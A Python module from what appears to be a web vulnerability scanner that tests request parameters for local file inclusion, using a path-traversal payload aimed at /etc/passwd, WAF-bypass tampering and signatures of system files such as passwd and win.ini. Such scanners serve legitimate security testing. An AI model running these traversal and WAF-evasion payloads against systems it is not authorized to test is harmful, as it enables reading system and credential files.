import re
from .tampering import apply_tampering
from . import bypass_oracle

LFI_SIGS = [r"root:x:0:0:", r"\[extensions\]", r"daemon:x:", r"\[fonts\]", r"Administrator:.*:500:", r"nginx:"]


def load_payloads_from_file(filename="payloads/lfi.txt"):
    try:
        with open(filename, 'r') as f:
            return [line.strip() for line in f if line.strip() and not line.startswith('#')]
    except Exception:
        return ["../../../../etc/passwd"]


def run_lfi_test(engine, point, param_name, level, bypass, waf_name=None):
    url = point['url']
    method = point['method']
    payloads = load_payloads_from_file()

    base = {p: 'x' for p in point['parameters']}

    forced_technique = None
    if bypass:
        forced_technique = bypass_oracle.probe_and_get_technique(engine, url, method, base, param_name, 'lfi', waf_name)

    for payload in payloads:
        final_payload = apply_tampering(payload, 'lfi', bypass, waf_name, technique=forced_technique)

        if bypass:
            resp = engine._send_request_raw(url, method, base, param_name, final_payload)
        else:
            data = base.copy() if method == 'POST' else None
            params = base.copy() if method == 'GET' else None
            if method == 'POST':
                data[param_name] = final_payload
            else:
                params[param_name] = final_payload
            resp = engine._send_request(url, method=method, data=data, params=params)

        if resp is not None:
            for sig in LFI_SIGS:
                if re.search(sig, resp.text):
                    details = f"Signature: {sig}"
                    if bypass and forced_technique:
                        details += f" - Technique de bypass utilisée : {forced_technique}"
                    engine.add_vulnerability("LFI", url, final_payload, details, parameter=param_name)
                    break
